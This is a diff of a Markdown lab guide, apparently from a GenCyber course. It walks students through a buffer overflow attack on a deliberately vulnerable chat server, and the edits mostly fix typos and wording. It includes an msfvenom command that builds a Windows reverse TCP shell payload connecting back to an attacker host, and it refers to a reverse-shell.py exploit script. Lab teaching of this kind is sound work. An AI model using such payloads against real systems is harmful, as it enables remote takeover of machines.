@@ -263,13 +263,13 @@ C:\Windows\system32>
 
 ### Hands-on 6: Buffer overflow attack via Python code
 
-Watch this video tutorial. Please note you have to adjust a few thigns in a minor way.
+Watch this video tutorial. Please note you have to adjust a few things in a minor way.
   
 [![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/LRNZxCC84RI/0.jpg)](https://youtu.be/LRNZxCC84RI)
 
 
 The Python code is /home/kali/GenCyber/vchat/Attack/reverse-shell.py on Kali VM.
-This attacks ubtilizes the buffer overflow vulnerability of the vulnerable chat server and sends a *reverse tcp shell* (one kind of malware code) payload, which connects back to the attacker and spawns a shell (terminal) at the attacker.
+This attack ubtilizes the buffer overflow vulnerability of the vulnerable chat server (i.e., vchat in our case) and sends a *reverse tcp shell* (one kind of malware code) payload, which connects back to the attacker and spawns a shell (Windows terminal) at the attacker's Kali VM.
 
 Here are steps:
  
@@ -290,7 +290,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.8 LPORT=4444 EXITFUNC=thread 
 ```
 You have to change LHOST to your Kali VM's IP. 
 
-- Use the output of msfvenom above, and replace the following code in a similar way
+Use the output of msfvenom above, and replace the following code in a similar way
 ```
 # Shellcode created by msfvenom
 # msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.8 LPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0a' 
